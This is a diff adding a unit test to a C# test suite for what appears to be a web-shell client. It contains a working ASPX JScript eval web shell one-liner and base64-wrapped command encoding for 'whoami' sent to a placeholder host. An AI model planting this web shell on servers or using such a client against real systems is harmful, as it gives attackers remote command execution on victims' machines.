@@ -107,6 +107,32 @@ public class WebShellTests
     }
 
     [Fact]
+    public void EvalAspxAdapter_RendersTheJScriptOneLiner_AndRoundTripsTheFramedAnswer()
+    {
+        var adapter = new EvalAspxAdapter();
+
+        var script = adapter.RenderScript("connect");
+        Assert.Equal(
+            "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"connect\"],\"unsafe\");%>",
+            script);
+        Assert.Equal("connect", adapter.ReadCredentialFromScript(script));
+
+        // The wrapper rides the connection parameter itself (the eval
+        // consumes the value directly), the command base64-encoded inside
+        // it; the answer frames with the family's markers around base64.
+        var request = adapter.EncodeCommand(
+            "http://web.example.test/up.aspx", "connect", "base64", "base64", "whoami");
+        var parameter = Assert.Single(request.Form);
+        Assert.Equal("connect", parameter.Key);
+        Assert.Contains("FromBase64String", parameter.Value);
+        Assert.DoesNotContain("whoami", parameter.Value);
+
+        var framed = request.TagStart + Convert.ToBase64String("uid=0(root)"u8) + request.TagEnd;
+        Assert.Equal("uid=0(root)", adapter.DecodeResponse(request, "base64", framed));
+        Assert.Null(adapter.DecodeResponse(request, "base64", "just a plain page"));
+    }
+
+    [Fact]
     public void Adapter_RendersTheEvalOneLiner()
     {
         var adapter = new EvalPhpAdapter();
